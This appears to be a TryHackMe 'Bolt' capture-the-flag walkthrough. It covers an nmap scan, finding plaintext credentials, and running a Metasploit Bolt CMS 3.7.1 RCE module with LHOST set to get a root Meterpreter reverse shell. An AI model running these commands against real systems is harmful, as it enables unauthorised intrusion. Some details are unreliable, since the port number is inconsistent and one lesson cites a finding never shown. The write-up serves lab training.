# 🛠️ Machine Walkthrough – Nmap, Enumeration & Exploitation

Room: https://tryhackme.com/room/bolt

---

## 📑 Table of Contents

- [Nmap Scan](#-nmap-scan)
- [Website Enumeration](#-website-enumeration)
  - [Discovery of Credentials](#discovery-of-credentials)
  - [Login Page and Version Identification](#login-page-and-version-identification)
  - [Known Exploit for Bolt CMS](#known-exploit-for-bolt-cms)
- [Exploitation via Metasploit](#exploitation-via-metasploit)
- [Root Access](#root-access)
- [Flag Retrieval](#flag-retrieval)
- [Summary](#summary)
- [Tools Used](#tools-used)

---

## 🔍 Nmap Scan

I started with a full TCP port scan to identify open services:

```bash
nmap -A -sV -sC 10.128.151.89
```

✅ Findings:

    Port 22 – SSH (OpenSSH 7.6p1 Ubuntu)

    Port 80 – HTTP (Apache httpd 2.4.29 Ubuntu)

    Port 8000 – HTTP-Alt (Bolt website)

📸 Screenshot:

![Nmap Scan](images/Pasted%20image%2020261108210524.png)

*Screenshot shows Nmap output listing all three ports with service versions*

---

## 🕵️ Website Enumeration

### Discovery of Credentials

After having a manual look at the website on port 888, I found a username 'bolt' and a password 'boltadmin123'.

📸 Screenshot:

![Credentials Found](images/Pasted%20image%2020261108210732.png)

*Screenshot shows credentials discovered during manual browsing*

---

### Login Page and Version Identification

Managed to find a login page at `/bolt` and login with the previous credentials. Looks like it uses **Bolt CMS 3.7.1**, and there was a previous public exploit for this specific version.

📸 Screenshots:

![Login Page](images/Pasted%20image%2020261108211612.png)

![Exploit Confirmation](images/Pasted%20image%2020261108211711.png)

*Screenshot shows the login page UI and confirmation of Bolt CMS 3.7.1*

---

## ☠️ Exploitation via Metasploit

I used Metasploit to exploit the known vulnerability in Bolt CMS 3.7.1.

⚙️ Configuring Metasploit:

```bash
msfconsole
use exploit/linux/http/bolt_cms_3_7_rce
set RHOSTS 10.128.151.89
set LHOST <your IP>
set URIPATH /bolt
run
```

📸 Screenshots:

![Metasploit Module Loaded](images/Pasted%20image%2020261108211906.png)

![Options Configuration](images/Pasted%20image%2020261108213644.png)

*Screenshot shows module loaded in Metasploit and options being set with LHOST from OpenVPN*

---

## 🚀 Root Access

After running the exploit, I gained root access with a Meterpreter shell on the victim machine.

📸 Screenshot:

![Root Access](images/Pasted%20image%2020261108213912.png)

---

## 🚩 Flag Retrieval

With root access, I retrieved the flag.

📸 Screenshot:

![Flag Found](images/Pasted%20image%2020261108213841.png)

---

## ✅ Summary

Phase	Result
Nmap Scan	Found SSH, Apache, and Bolt website
Enumeration	Discovered username/password pair
Initial Access	Logged into Bolt CMS 3.7.1
Exploitation	Used known CVE in Metasploit
Final Result	Root access obtained, flag retrieved
## 📌 Tools Used

    Nmap

    Metasploit

---

## ⚠️ Lessons Learned

- Websites often expose hardcoded credentials through unexpected paths
- CMS applications have well-documented CVEs that can be exploited directly
- The `http-open-proxy: Proxy might be redirecting requests` finding should have flagged potential OpenVPN tunneling
- Always verify CMS version during enumeration so you can target the right exploit module
- Browsers reveal credentials in plain text if the source code is visible — check before relying on guesses
